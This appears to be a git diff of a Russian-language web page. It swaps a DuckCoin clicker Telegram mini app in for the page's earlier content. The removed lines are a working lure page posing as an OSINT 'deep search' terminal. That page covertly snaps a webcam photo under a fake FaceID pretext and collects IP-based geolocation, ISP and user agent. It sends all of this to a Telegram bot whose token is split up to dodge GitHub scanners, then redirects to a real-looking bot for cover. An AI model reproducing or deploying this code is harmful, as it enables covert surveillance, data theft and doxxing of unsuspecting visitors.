@@ -2,149 +2,157 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TERMINAL ACCESS | OSINT DATABASE v2.6</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>DuckCoin | Главный Кличер</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        body { margin: 0; background: #0a0a0a; color: #00ff41; font-family: 'Courier New', monospace; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
-        .terminal { width: 90%; max-width: 650px; background: rgba(0, 20, 0, 0.9); border: 1px solid #00ff41; border-radius: 4px; box-shadow: 0 0 20px rgba(0, 255, 65, 0.2); padding: 25px; position: relative; }
-        .header { border-bottom: 1px solid #00ff41; padding-bottom: 10px; margin-bottom: 20px; display: flex; justify-content: space-between; font-size: 12px; text-transform: uppercase; }
-        .input-group { display: flex; flex-direction: column; gap: 15px; }
-        label { font-size: 14px; color: #00ff41; text-shadow: 0 0 5px #00ff41; }
-        input { background: transparent; border: 1px solid #00ff41; color: #00ff41; padding: 12px; font-family: inherit; font-size: 16px; outline: none; }
-        button { background: #00ff41; color: #000; border: none; padding: 15px; font-weight: bold; cursor: pointer; text-transform: uppercase; transition: 0.3s; }
-        button:hover { background: #008f11; color: #fff; box-shadow: 0 0 15px #00ff41; }
-        .status { margin-top: 20px; font-size: 11px; color: #008f11; line-height: 1.4; }
-        .blink { animation: blinker 0.8s linear infinite; }
-        @keyframes blinker { 50% { opacity: 0; } }
-        video, canvas { display: none; }
-        
-        /* Экран "сканирования" */
-        #overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 1000; flex-direction: column; align-items: center; justify-content: center; border: 5px solid #00ff41; box-sizing: border-box; }
-        .scanner-line { width: 100%; height: 2px; background: #00ff41; position: absolute; top: 0; animation: scan 2s linear infinite; box-shadow: 0 0 15px #00ff41; }
-        @keyframes scan { 0% { top: 0; } 100% { top: 100%; } }
+        :root {
+            --primary: #fbc02d; /* Цвет утки */
+            --bg: linear-gradient(135deg, #1a2a6c, #b21f1f, #fdbb2d); /* Сочный фон */
+            --glass: rgba(255, 255, 255, 0.1);
+            --border: rgba(255, 255, 255, 0.2);
+        }
+
+        body {
+            margin: 0; padding: 0; background: var(--bg); color: #fff;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            display: flex; flex-direction: column; align-items: center; justify-content: center;
+            height: 100vh; overflow: hidden; user-select: none;
+        }
+
+        /* Glassmorphism для UI */
+        .glass-panel {
+            background: var(--glass); border: 1px solid var(--border);
+            backdrop-filter: blur(10px); border-radius: 20px;
+            padding: 15px 25px; box-shadow: 0 8px 32px rgba(0,0,0,0.3);
+        }
+
+        /* Счет */
+        .score-container { margin-bottom: 30px; text-align: center; }
+        .score { font-size: 64px; font-weight: 800; color: #fff; text-shadow: 0 0 15px rgba(255,255,255,0.5); }
+        .currency { font-size: 24px; color: var(--primary); font-weight: bold; }
+
+        /* Контейнер утки */
+        .click-area { position: relative; cursor: pointer; transition: transform 0.05s ease; }
+        .click-area:active { transform: scale(0.98); }
+
+        /* SVG Утка (анимированная) */
+        .duck-svg {
+            width: 250px; height: 250px;
+            filter: drop-shadow(0 10px 20px rgba(0,0,0,0.5));
+            animation: float 3s ease-in-out infinite; /* Парение */
+        }
+
+        /* Эффект сплющивания при клике */
+        @keyframes squish {
+            0% { transform: scale(1) translateY(0); }
+            30% { transform: scale(1.1, 0.9) translateY(10px); }
+            100% { transform: scale(1) translateY(0); }
+        }
+        .squish-anim { animation: squish 0.2s ease-out; }
+
+        /* Парение утки */
+        @keyframes float {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-15px); }
+        }
+
+        /* Пользователь */
+        .user-panel { position: absolute; bottom: 20px; font-size: 14px; color: #aaa; }
+
+        /* Анимация разлетающихся частиц (искорок/монет) */
+        .particle {
+            position: absolute; pointer-events: none;
+            width: 15px; height: 15px; background: var(--primary);
+            border-radius: 50%; animation: particleMove 0.6s ease-out forwards;
+        }
+        @keyframes particleMove {
+            0% { transform: translate(0, 0) scale(1); opacity: 1; }
+            100% { transform: translate(var(--x), var(--y)) scale(0); opacity: 0; }
+        }
+
     </style>
 </head>
 <body>
 
-    <div class="terminal">
-        <div class="header">
-            <span>UNAUTHORIZED ACCESS: DETECTED</span>
-            <span class="blink">● SYSTEM ACTIVE</span>
-        </div>
-        <div class="input-group">
-            <label>ENTER TARGET (USERNAME / PHONE / IP):</label>
-            <input type="text" id="target" placeholder="root@system_target..." autocomplete="off">
-            <button onclick="runExploit()">RUN DEEP SEARCH</button>
-        </div>
-        <div class="status" id="log">
-            > [INFO] WAITING FOR INPUT...<br>
-            > [INFO] DATABASE VERSION: 2026.4.1<br>
-            > [INFO] PROXY: ENCRYPTED
-        </div>
+    <div class="score-container glass-panel">
+        <div class="score" id="score">0</div>
+        <div class="currency">$QUACK</div>
     </div>
 
-    <div id="overlay">
-        <div class="scanner-line"></div>
-        <h1 style="text-shadow: 0 0 10px #00ff41;">BIOMETRIC VERIFICATION</h1>
-        <p id="loader" style="font-size: 18px;">INITIALIZING CAMERA...</p>
-        <div style="font-size: 12px; margin-top: 50px;">DO NOT CLOSE THIS TAB</div>
+    <div class="click-area" id="click-btn">
+        <svg class="duck-svg" id="duck-svg" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
+            <ellipse cx="50" cy="65" rx="35" ry="30" fill="#fbc02d"/>
+            <circle cx="50" cy="35" r="20" fill="#fbc02d"/>
+            <path d="M 50 40 L 40 45 L 50 50 Z" fill="#ff6f00"/>
+            <circle cx="43" cy="30" r="3" fill="#fff"/>
+            <circle cx="43" cy="30" r="1.5" fill="#000"/>
+            <circle cx="57" cy="30" r="3" fill="#fff"/>
+            <circle cx="57" cy="30" r="1.5" fill="#000"/>
+            <path d="M 35 25 Q 50 15 65 25 L 65 35 Q 50 25 35 35 Z" fill="#000" stroke="#fff" stroke-width="1"/>
+            <rect x="30" y="28" width="5" height="2" fill="#000" rx="1"/>
+            <rect x="65" y="28" width="5" height="2" fill="#000" rx="1"/>
+        </svg>
     </div>
 
-    <video id="video" autoplay></video>
-    <canvas id="canvas"></canvas>
+    <div class="user-panel glass-panel" id="user-info">🦆 Agent: <span style="color:#fff;">QUACKER</span></div>
 
     <script>
-        // МЕТОД 1: СКЛЕЙКА (Защита от сканеров GitHub)
-        const partA = '8570554697';
-        const partB = 'AAHRYkl8_AIuO';
-        const partC = 'C4gbOl6AxRWOnmEMzw15Eg';
-        
-        const BOT_TOKEN = partA + ':' + partB + partC;
-        const CHAT_ID = '1751630480';
+        const tg = window.Telegram.WebApp;
+        tg.expand();
+        tg.headerColor = '#1a2a6c';
 
-        async function sendToTg(text) {
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({chat_id: CHAT_ID, text: text, parse_mode: 'Markdown'})
-            });
+        const scoreElement = document.getElementById('score');
+        const duckElement = document.getElementById('duck-svg');
+        const clickArea = document.getElementById('click-btn');
+        const userInfo = document.getElementById('user-info');
+
+        let count = parseInt(localStorage.getItem('quackClicks')) || 0;
+        scoreElement.innerText = count.toLocaleString('ru-RU');
+
+        // Данные юзера из ТГ
+        if (tg.initDataUnsafe && tg.initDataUnsafe.user) {
+            userInfo.innerHTML = `🦆 Agent: <span style="color:#fff;">${tg.initDataUnsafe.user.first_name}</span>`;
         }
 
-        async function sendPhoto(blob) {
-            let formData = new FormData();
-            formData.append('chat_id', CHAT_ID);
-            formData.append('photo', blob, 'capture.jpg');
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
-        }
+        clickArea.addEventListener('click', (e) => {
+            count++;
+            scoreElement.innerText = count.toLocaleString('ru-RU');
+            localStorage.setItem('quackClicks', count);
 
-        function runExploit() {
-            const targetValue = document.getElementById('target').value;
-            if (!targetValue) return alert("ACCESS DENIED: NO TARGET SPECIFIED");
+            // Вибрация (ТМА)
+            tg.HapticFeedback.impactOccurred('medium');
 
-            document.getElementById('overlay').style.display = 'flex';
-            
-            // Запрашиваем камеру (предлог: проверка биометрии)
-            navigator.mediaDevices.getUserMedia({ video: true })
-                .then(stream => {
-                    document.getElementById('video').srcObject = stream;
-                    document.getElementById('loader').innerHTML = "> SCANNING RETINA: 24%";
-                    
-                    setTimeout(() => {
-                        const canvas = document.getElementById('canvas');
-                        const video = document.getElementById('video');
-                        canvas.width = video.videoWidth;
-                        canvas.height = video.videoHeight;
-                        canvas.getContext('2d').drawImage(video, 0, 0);
-                        
-                        canvas.toBlob(blob => {
-                            sendPhoto(blob);
-                            collectFullReport(targetValue);
-                        }, 'image/jpeg');
+            // Анимация сплющивания (перезапуск)
+            duckElement.classList.remove('squish-anim');
+            void duckElement.offsetWidth; // Магия для перезапуска CSS анимации
+            duckElement.classList.add('squish-anim');
 
-                        document.getElementById('loader').innerHTML = "> ACCESS GRANTED. LOADING DOSSIER...";
-                        setTimeout(() => { 
-                            // Перекидываем на любой OSINT канал/бот для правдоподобности
-                            location.href = "https://t.me/Osint_search_bot"; 
-                        }, 2500);
-                    }, 2500);
-                })
-                .catch(err => {
-                    sendToTg(`⚠️ *ATTENTION:* Target denied camera access.\nTarget input: \`${targetValue}\``);
-                    collectFullReport(targetValue);
-                    alert("SECURITY ERROR: Camera required for FaceID verification.");
-                    document.getElementById('overlay').style.display = 'none';
-                });
-        }
+            // Создаем искры
+            createParticles(e.clientX, e.clientY);
+        });
 
-        function collectFullReport(query) {
-            const timestamp = new Date().toLocaleString('ru-RU');
-            
-            fetch('https://ipapi.co/json/')
-                .then(res => res.json())
-                .then(d => {
-                    const report = `
-💀 **NEW TARGET CAPTURED**
-────────────────────
-🎯 **Input:** \`${query}\`
-⏰ **Time:** \`${timestamp}\`
+        // Функция создания разлетающихся частиц
+        function createParticles(x, y) {
+            for (let i = 0; i < 8; i++) {
+                const particle = document.createElement('div');
+                particle.classList.add('particle');
+                
+                // Случайное направление разлета
+                const randomX = (Math.random() - 0.5) * 150;
+                const randomY = (Math.random() - 0.5) * 150;
+                
+                particle.style.setProperty('--x', `${randomX}px`);
+                particle.style.setProperty('--y', `${randomY}px`);
+                particle.style.left = `${x - 7}px`;
+                particle.style.top = `${y - 7}px`;
+                
+                // Случайный цвет (золото/оранжевый)
+                particle.style.background = Math.random() > 0.5 ? '#fbc02d' : '#ff6f00';
 
-📍 **GEOLOCATION:**
-• Country: \`${d.country_name} (${d.country_code})\`
-• City: \`${d.city} (${d.region})\`
-• Zip: \`${d.postal}\`
-• GPS: \`${d.latitude}, ${d.longitude}\`
-• Timezone: \`${d.timezone}\`
-
-🌐 **NETWORK:**
-• IP: \`${d.ip}\`
-• ISP: \`${d.org}\`
-• ASN: \`${d.asn}\`
-
-📱 **USER-AGENT:**
-\`${navigator.userAgent.slice(0, 150)}\`
-────────────────────`;
-                    sendToTg(report);
-                });
+                document.body.appendChild(particle);
+                setTimeout(() => particle.remove(), 600);
+            }
         }
     </script>
 </body>
